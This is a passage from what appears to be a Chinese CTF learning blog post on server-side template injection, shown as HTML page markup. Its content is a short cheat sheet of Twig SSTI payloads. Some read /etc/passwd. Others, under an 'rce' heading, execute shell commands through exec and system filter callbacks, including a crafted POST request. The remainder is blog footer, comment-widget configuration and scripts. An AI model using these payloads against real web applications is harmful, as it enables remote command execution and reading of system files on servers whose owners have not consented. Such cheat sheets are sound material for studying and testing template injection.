+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;/etc/passwd&#x27;</span>|file_excerpt(<span class="number">1</span>,<span class="number">30</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;app.request.files.<span class="keyword">get</span>(<span class="number">1</span>).__construct(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;app.request.files.<span class="keyword">get</span>(<span class="number">1</span>).openFile.fread(<span class="number">99</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>rce</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;id&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[<span class="string">&#x27;cat /etc/passwd&#x27;</span>]|filter(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">POST /subscribe?0=<span class="built_in">cat</span>+/etc/passwd HTTP/1.1</span><br><span class="line">&#123;&#123;app.request.query.filter(0,0,1024,&#123;<span class="string">&#x27;options&#x27;</span>:<span class="string">&#x27;system&#x27;</span>&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	<!-- 
+		<span id="/2023/10/20/ssti/" class="leancloud-visitors view" data-flag-title="SSTI模板注入">
+			<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+		</span>
+	 -->
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/10/17/GDOUCTF2023-ezze-wp/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"7m4bFydh606FgGbxRPsI8M6l-gzGzoHsz","appKey":"edXvAXhOXIvksZqtq8b5AXWj","placeholder":"input your comment: ","visitor":true,"avatar":"retro","lang":"en","metaPlaceholder":{"nick":"nick","mail":"mail","link":"link"},"requiredFields":["nick","mail","link"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "input your comment: ",
+    //     avatar:"retro",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail,link".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-10-20 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/web-learning/">web-learning<span>5</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CTF/">CTF<span>83</span></a></li> <li><a href="/tags/web/">web<span>52</span></a></li> <li><a href="/tags/SSTI/">SSTI<span>5</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer>  </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
